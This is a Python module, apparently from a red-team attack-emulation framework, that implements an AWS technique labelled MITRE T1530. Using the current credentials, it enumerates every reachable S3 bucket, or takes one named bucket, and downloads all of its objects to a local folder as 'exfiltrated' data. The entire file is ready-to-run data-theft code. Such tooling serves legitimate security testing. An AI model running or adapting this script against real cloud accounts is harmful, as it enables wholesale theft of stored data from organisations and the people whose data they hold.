from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import boto3
from botocore.exceptions import ClientError
import os
from attack_techniques.aws.aws_enumerate_s3_buckets import AWSEnumerateS3Buckets

@TechniqueRegistry.register
class AWSExfilS3Bucket(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1530",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            )
        ]
        super().__init__("Exfiltrate S3 Bucket", "Exfiltrates all S3 buckets available. Optionally, exfiltrate a target S3 bucket in AWS. Warning: Exfiltrating all buckets can run very long and use a lot of space on your disk.", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        def download_objects(s3_client, bucket_name, local_directory):
            """Download all objects from a given bucket, preserving folder structure."""
            try:
                # Ensure the local directory exists
                os.makedirs(local_directory, exist_ok=True)

                # List all objects in the bucket
                paginator = s3_client.get_paginator('list_objects_v2')
                for page in paginator.paginate(Bucket=bucket_name):
                    for obj in page.get('Contents', []):
                        # Get the object key - full path in the bucket
                        key = obj['Key']
                        
                        # Create the full local file path
                        local_file_path = os.path.join(local_directory, key)
                        
                        # Confirm the directory exists
                        os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
                        
                        # Check if the object is a folder
                        if key.endswith('/'):
                            print(f"Creating directory: {local_file_path}")
                            os.makedirs(local_file_path, exist_ok=True)
                        else:
                            # Download the file
                            print(f"Downloading {key} from {bucket_name}")
                            s3_client.download_file(bucket_name, key, local_file_path)
            except ClientError as e:
                print(f"Error downloading objects from {bucket_name}: {e}")

        try:
            bucket_name: str = kwargs.get("bucket_name", None)
            # Ref: https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3/client/download_file.html
            # Initialize boto3 client
            my_client = boto3.client("s3")

            if bucket_name in [None, "", "all"]:
                # Enumerate with Halberd S3 bucket enumeration module
                s3_enumeration = AWSEnumerateS3Buckets().execute()
                if isinstance(s3_enumeration, tuple) and len(s3_enumeration) == 2:
                    result, response = s3_enumeration
                    if result.value == "success":
                        buckets = response['value']
                else:
                    return ExecutionStatus.FAILURE, {
                        "error": "Failed to exfiltrate S3 - S3 bucket enumeration failed",
                        "message": "Failed to exfiltrate S3 - S3 bucket enumeration failed"
                    }
                        
                if not buckets:
                    return ExecutionStatus.FAILURE, {
                        "error": "Failed to exfiltrate S3 - No buckets found",
                        "message": "Failed to exfiltrate S3 - No buckets found"
                    }
            else:
                buckets = [bucket_name]

            base_download_path = "./output/s3_bucket_download/"
            
            for bucket in buckets:
                print(bucket)
                # Create local download path with bucket name
                download_path = os.path.join(base_download_path, bucket)
                # Download bucket objects
                download_objects(my_client, bucket, download_path)

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully exfiltrated S3 buckets",
                "value": {
                    "totals_bucket_exfiltrated" : len(buckets),
                    "exfil_path" : base_download_path
                }
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to exfiltrate S3 buckets"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "bucket_name": {"type": "str", "required": False, "default": "All", "name": "S3 Bucket Name", "input_field_type" : "text"}
        }